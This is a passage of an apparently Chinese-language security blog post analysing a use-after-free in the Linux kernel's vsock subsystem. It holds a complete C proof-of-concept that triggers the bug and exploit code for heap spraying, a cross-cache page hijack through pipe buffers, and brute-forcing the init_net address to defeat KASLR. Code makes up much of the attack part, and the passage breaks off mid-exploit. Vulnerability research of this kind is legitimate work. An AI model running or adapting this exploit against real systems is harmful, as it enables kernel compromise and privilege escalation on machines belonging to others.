class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/vm_sockets.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_PORT_RETRIES	24	<span class="comment">/* net/vmw_vsock/af_vsock.c */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> VMADDR_CID_NONEXISTING	42</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pause() {write(STDOUT_FILENO, <span class="string">"[*] Paused (press enter to continue)\n"</span>, 37); getchar();}</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Create socket &lt;type&gt;, bind to &lt;cid, port&gt; and return the file descriptor. */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vsock_bind</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> cid, <span class="type">unsigned</span> <span class="type">int</span> port, <span class="type">int</span> type)</span></span><br><span class="line">{</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">sa</span> =</span> {</span><br><span class="line">		.svm_family = AF_VSOCK,</span><br><span class="line">		.svm_cid = cid,</span><br><span class="line">		.svm_port = port,</span><br><span class="line">	};</span><br><span class="line">	<span class="type">int</span> fd;</span><br><span class="line"></span><br><span class="line">	fd = socket(AF_VSOCK, type, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (fd &lt; <span class="number">0</span>) {</span><br><span class="line">		perror(<span class="string">"socket"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (bind(fd, (<span class="keyword">struct</span> sockaddr *)&amp;sa, <span class="keyword">sizeof</span>(sa))) {</span><br><span class="line">		perror(<span class="string">"bind"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> fd;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Test attempts to trigger a transport release for an unbound socket. This can</span></span><br><span class="line"><span class="comment"> * lead to a reference count mishandling.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> {</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> sockets[MAX_PORT_RETRIES];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_vm</span> <span class="title">addr</span>;</span></span><br><span class="line">	<span class="type">int</span> s, i, alen;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// execute vsock_create &amp; vsock_bind in kernel</span></span><br><span class="line">	s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);</span><br><span class="line"></span><br><span class="line">	alen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line">	<span class="keyword">if</span> (getsockname(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;alen)) {</span><br><span class="line">		perror(<span class="string">"getsockname"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 循环绑定多个套接字，递增端口号（++addr.svm_port），目的是 耗尽可用端口，使后续 connect() 失败</span></span><br><span class="line">	<span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_PORT_RETRIES; ++i) {</span><br><span class="line">		sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,</span><br><span class="line">					SOCK_SEQPACKET);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"[+] sockets[%d] == %d\n"</span>, i, sockets[i]);</span><br><span class="line">	}</span><br><span class="line">	</span><br><span class="line">	<span class="comment">// 关闭初始套接字，重新创建一个新的 VSOCK 套接字</span></span><br><span class="line">	close(s);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for input</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Setup Finished..."</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">	s = socket(AF_VSOCK, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (s &lt; <span class="number">0</span>) {</span><br><span class="line">		perror(<span class="string">"socket"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #1 success\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// connect() #1 failed: transport set, sk in unbound list.</span></span><br><span class="line"></span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">"[*] First connect over!"</span>);</span><br><span class="line">	addr.svm_cid = VMADDR_CID_NONEXISTING;	<span class="comment">// switch transport</span></span><br><span class="line">    addr.svm_port = VMADDR_PORT_ANY;			<span class="comment">// dont need</span></span><br><span class="line">	<span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #2 success\n"</span>);</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	}</span><br><span class="line">	<span class="comment">// connect() #2 failed: transport unset, sk ref dropped?</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for input</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Press for Crash..."</span>);</span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Vulnerable system may crash now. [USE THE DANGLING POINTER]</span></span><br><span class="line">	bind(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// wait for input</span></span><br><span class="line">    getchar();</span><br><span class="line"></span><br><span class="line">	close(s);</span><br><span class="line">	<span class="keyword">while</span> (i--)</span><br><span class="line">		close(sockets[i]);</span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>





<h2 id="Vulnerability"><a href="#Vulnerability" class="headerlink" title="Vulnerability"></a>Vulnerability</h2><p><strong>Setup ENV</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">s = vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);</span><br><span class="line"></span><br><span class="line">alen = <span class="keyword">sizeof</span>(addr);</span><br><span class="line"><span class="keyword">if</span> (getsockname(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, &amp;alen)) {</span><br><span class="line">    perror(<span class="string">"getsockname"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; MAX_PORT_RETRIES; ++i)</span><br><span class="line">    sockets[i] = vsock_bind(VMADDR_CID_ANY, ++addr.svm_port,</span><br><span class="line">                            SOCK_SEQPACKET);</span><br><span class="line"></span><br><span class="line">close(s);</span><br></pre></td></tr></table></figure></div>

<p>这一步主要用于初始化漏洞利用环境（可以参考前面部分<code>__vsock_bind_connectible</code>的相关实现逻辑），主要是先通过<code>vsock_bind(VMADDR_CID_LOCAL, VMADDR_PORT_ANY, SOCK_SEQPACKET);</code> 创建并绑定一个<code>vsock</code> 套接字到<code>s</code>，这一步实际是用来得到<code>addr.svm_port</code>，在后续<code>for</code>循环中将会在该端口值的基础上递增，用来将最大允许的 <code>MAX_PORT_RETRIES</code> 端口数量消耗完，这一步将会导致后续绑定一个新的<code>vsock</code> 套接字后，调用  <code>connect</code> 找不到可用端口，返回错误，从而触发漏洞相关逻辑。</p>
<p>**STEP.1 **</p>
<p><strong>vsock_create() (refcnt=1) calls vsock_insert_unbound() (refcnt=2)</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vsock_bind wrapped by func `socket` &amp; `bind` in userspace</span></span><br><span class="line">s = socket(AF_VSOCK, SOCK_STREAM, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></div>

<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_00-16-35.png" alt="nipaste_2025-06-06_00-16-3"></p>
<p><strong>STEP.2</strong></p>
<p><strong>transport-&gt;release() calls vsock_remove_bound() without checking if sk was bound and moved to bound list (refcnt=1)</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*---------First connect----------*/</span></span><br><span class="line"><span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #1 success\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// connect() #1 failed: transport set, sk in unbound list.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*---------Second connect----------*/</span></span><br><span class="line">addr.svm_cid = VMADDR_CID_NONEXISTING;</span><br><span class="line">addr.svm_port = VMADDR_PORT_ANY;</span><br><span class="line"><span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #2 success\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// connect() #2 failed: transport unset, sk ref dropped?</span></span><br></pre></td></tr></table></figure></div>

<p><strong>第一次 connect 触发执行路径如下所示：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-02-20.png" alt="nipaste_2025-06-06_03-02-2"></p>
<p>此时，由于<code>vsock_auto_bind</code>返回失败，vsk仍然还在<code>unbound list</code>当中，需要强调的是<code>vsock_auto_bind</code>会失败是因为前面一开始，就通过耗尽<code>VMADDR_CID_ANY</code>对应<code>cid</code>下所有的有效端口数量，从而使得返回<code>-EADDRNOTAVAIL</code>，相关代码逻辑如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-09-02.png" alt="nipaste_2025-06-06_03-09-0"></p>
<p>内核调试验证如下所示：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-03-08.png" alt="nipaste_2025-06-06_03-03-0"></p>
<p>关于这一步<code>connect</code>的作用在后续分析第二次<code>connect</code>时会有提到。</p>
<p><strong>第二次 connect 触发执行路径如下所示：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-28-15.png" alt="nipaste_2025-06-06_03-28-1"></p>
<p><strong>再来关注下<code>vsock_assign_transport</code> 这个函数，该函数实际就是触发 UAF 的所在函数</strong>，内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-09-28.png" alt="nipaste_2025-06-06_04-09-2"></p>
<blockquote>
<p>在执行<code>transport-&gt;release</code> 之后，<code>vsock_deassign_transport</code> 将会把 <code>transport</code> 置为空</p>
</blockquote>
<p>为方便理解，这里用实际调试时的场景进行解释：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-53-10.png" alt="nipaste_2025-06-06_03-53-1"></p>
<p>在第一次 <code>connect</code> 时，由于此时 <code>vsk-&gt;transport</code> 还未初始化，因此该值为 0，如上图所示，但在函数后面会将<code>vsk-&gt;transport</code> 初始化为 <code>new_transport</code>，即<code>loopback_transport</code>，因为第一次执行<code>connect</code> 时<code>addr.svm_cid</code> 为 <code>VMADDR_CID_LOCAL</code>（对应内核中的<code>remote_cid</code>），此时<code>transport</code>将会被设置为<code>transport_local</code>（对应为<code>loopback_transport</code>），这也是为什么前面需要一次<code>connect</code>操作。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_03-54-21.png" alt="nipaste_2025-06-06_03-54-2"></p>
<p>在执行第二次<code>connect</code>时，此时 <code>vsk-&gt;transport</code>和<code>new_transport</code>内容分别如上图所示，此时会调用 <code>vsk-&gt;transport-&gt;release(vsk)</code>，而该函数指针实际调用为<code>virtio_transport_release</code></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-17-10.png" alt="nipaste_2025-06-06_04-17-1"></p>
<p>在该函数内部会调用<code>virtio_transport_remove_sock</code>，内容如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-18-36.png" alt="nipaste_2025-06-06_04-18-3"></p>
<p>因而使得这里的有效引用位减一。</p>
<p><strong>STEP.3</strong></p>
<p><strong>注意这里的 vsock_auto_bind 还会进行一次释放</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-46-58.png" alt="nipaste_2025-06-06_04-46-5"></p>
<p>最终会触发执行</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-48-33.png" alt="nipaste_2025-06-06_04-48-3"></p>
<p>相较于第一次<code>connect</code>失败，第二次<code>connect</code>可以正常进行 bind 操作，是因为第二次<code>connect</code>时，通过 Step.2 可知<code>transport-&gt;release</code>会将<code>vsk</code> 状态重置，如下图所示，此时在函数<code>__vsock_bind_connectible</code>调用<code>__vsock_find_bound_socket</code>会返回 NULL（VSOCK地址未被<code>vsk</code>占用），会正常完成绑定操作。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_19-15-44.png" alt="Snipaste_2025-06-12_19-15-44"></p>
<p>内核调试验证如下，此时由于<code>refcnt = 0</code> 会进入到<code>__sk_free(sk)</code> ，会使得该堆块被释放，从而在进入到<code>__vsock_insert_bound</code> 时会触发 UAF。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_02-19-30.png" alt="nipaste_2025-06-06_02-19-3"></p>
<p>Crash 如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-06_04-56-27.png" alt="nipaste_2025-06-06_04-56-2"></p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>这一部分<a class="link" target="_blank" rel="noopener" href="https://hoefler.dev/articles/vsock.html">原文 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>说的也比较详细，这里主要说一些笔者角度的理解。</p>
<p><strong>Step.1 Spray vsock heap object and alloc target vsock for uaf</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] pre alloc sockets"</span>);</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span> pre[PRE];</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE; i++)</span><br><span class="line">    pre[i] = socket(AF_VSOCK, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] alloc target"</span>);</span><br><span class="line">s = socket(AF_VSOCK, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (s &lt; <span class="number">0</span>) {</span><br><span class="line">	perror(<span class="string">"socket"</span>);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">   <span class="comment">// testing</span></span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] post-alloc objects"</span>);</span><br><span class="line">   <span class="type">int</span> post[POST];</span><br><span class="line">   <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; POST; i++)</span><br><span class="line">       post[i] = socket(AF_VSOCK, SOCK_SEQPACKET, <span class="number">0</span>);</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">   <span class="built_in">puts</span>(<span class="string">"[+] trigger uaf"</span>);</span><br><span class="line"><span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #1 success\n"</span>);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// connect() #1 failed: transport set, sk in unbound list.</span></span><br><span class="line"></span><br><span class="line">addr.svm_cid = VMADDR_CID_NONEXISTING;</span><br><span class="line">   addr.svm_port = VMADDR_PORT_ANY;</span><br><span class="line"><span class="keyword">if</span> (!connect(s, (<span class="keyword">struct</span> sockaddr *)&amp;addr, alen)) {</span><br><span class="line">	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Unexpected connect() #2 success\n"</span>);</span><br><span class="line">	<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">}</span><br><span class="line"><span class="comment">// connect() #2 failed: transport unset, sk ref dropped?</span></span><br></pre></td></tr></table></figure></div>

<p>因为在实际测试过程中发现这里 <code>vsock</code>套接字的分配来自独立缓存，如下图所示，所以需要借助 <code>Cross Cache Attack</code> 完成利用，这一步主要就是堆喷相关结构体，然后触发目标<code>vuln_vsk</code> UAF。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_13-35-37.png" alt="Snipaste_2025-06-12_13-35-37"></p>
<p><strong>Step.2 Release target slab back to buddy system</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] uaf finished!.."</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] fill up the cpu partial list"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt; FLUSH; i += OBJS_PER_SLAB)</span><br><span class="line">    close(junk[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] free all the pre/post alloc-ed objects"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; POST; i++)</span><br><span class="line">    close(post[i]);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PRE; i++)</span><br><span class="line">    close(pre[i]);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] close the junk bound sockets"</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; FLUSH; i++)</span><br><span class="line"> close(junk[i]);</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">3</span>);</span><br></pre></td></tr></table></figure></div>

<p>这一步主要是将<code>vuln_vsk</code>所在的<code>vuln_slab</code>释放回伙伴系统，用于后面<code>PageHijack</code>（通过<code>pipe_buffer</code>来进行实现）。</p>
<p><strong>Step.3 Hijack vuln_slab and detect whether hits target slab by brute force</strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> pipes[NUM_PIPES][<span class="number">2</span>];</span><br><span class="line"><span class="type">char</span> page[PAGE_SIZE];</span><br><span class="line"><span class="built_in">memset</span>(page, <span class="number">2</span>, PAGE_SIZE);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[+] reclaim page"</span>);</span><br><span class="line">pause();</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> w = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> j;</span><br><span class="line">i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) { <span class="comment">// <span class="doctag">TODO:</span> i &lt; NUM_PIPES, improve stability</span></span><br><span class="line"></span><br><span class="line">    sleep(<span class="number">0.1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(&amp;pipes[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    w = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (w &lt; PAGE_SIZE) {</span><br><span class="line">        <span class="type">ssize_t</span> written = write(pipes[i][<span class="number">1</span>], page, <span class="number">8</span>);</span><br><span class="line">        j = query_vsock_diag();</span><br><span class="line">        w += written;</span><br><span class="line">        <span class="keyword">if</span> (j != <span class="number">48</span>) <span class="keyword">goto</span> out;</span><br><span class="line">    }</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"."</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    i++;</span><br><span class="line">    <span class="keyword">if</span> (i % <span class="number">32</span> == <span class="number">0</span>) <span class="built_in">puts</span>(<span class="string">""</span>);</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>可以看到这里采用了一个稍微比较巧妙的方式来判断<code>vuln_vsk</code>是否被损坏，即通过每次写<code>write</code> 8字节的方式，然后调用<code>query_vsock_diag</code>是否执行成功判断是否命中成功。<code>query_vsock_diag</code>最终会调用到<code>vsock_diag_dump</code> 函数中，该函数中有两个检查，具体如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_14-17-51.png" alt="Snipaste_2025-06-12_14-17-51"></p>
<p>其中第二个检查比较好绕过，设置对应的<code>sk-&gt;sk_state</code> 为2即可，<code>sock_net</code> 对应<code>sk</code>偏移为0x30的位置，因此如果该位置出现损坏，将会读取失败（最终反应在 <code>len</code> 字段上面），从下图可以看到比较的对象是<code>init_net</code>，该值为<code>0xffffffff84bb1f80</code>，因此为了绕过这个判断，我们需要对<code>init_net</code>的地址进行爆破（Step.4）。</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-06-12_14-08-23.png" alt="Snipaste_2025-06-12_14-08-23"></p>
<p><strong>Step.4 Brute force the address of  <code>init_net</code></strong></p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> base = <span class="number">0xffffffff84bb1000</span>; <span class="comment">// probably need to change for aslr</span></span><br><span class="line"><span class="type">long</span> off = <span class="number">0</span>;</span><br><span class="line"><span class="type">long</span> addy;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+] attempting net overwrite (aslr bypass).\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (off &lt; <span class="number">0xffffffff</span>) {</span><br><span class="line"></span><br><span class="line">    <span class="comment">// release the page of vsk</span></span><br><span class="line">    close(pipes[i][<span class="number">0</span>]);</span><br><span class="line">    close(pipes[i][<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pipe(&amp;pipes[i][<span class="number">0</span>]) &lt; <span class="number">0</span>) {</span><br><span class="line">        perror(<span class="string">"pipe"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    addy = base + off;</span><br><span class="line"></span><br><span class="line">    write(pipes[i][<span class="number">1</span>], page, w - <span class="number">8</span>);</span><br><span class="line">    write(pipes[i][<span class="number">1</span>], &amp;addy, <span class="number">8</span>);    <span class="comment">//position of sock_net(sk)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (off % <span class="number">256</span> == <span class="number">0</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"+"</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    j = query_vsock_diag();</span><br><span class="line">    <span class="keyword">if</span> (j == <span class="number">48</span>) {</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n[*] LEAK init_net @ 0x%lx\n"</span>, base + off);</span><br><span class="line">        <span class="keyword">goto</span> out2;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    off += <span class="number">128</span>; <span class="comment">// <span class="doctag">TODO:</span> modify for aslr?</span></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这里先是估计了一个<code>init_net</code>的基地址<code>0xffffffff84bb1000</code>，然后从这个基地址开始爆破，爆破的思路是只要发现在写入新的<code>init_net</code>值后，不能通过<code>vsock_diag_dump</code>的判断就重新释放<code>vuln_slab</code>，然后重新获取该<code>slab</code>在尝试进行写。</p>
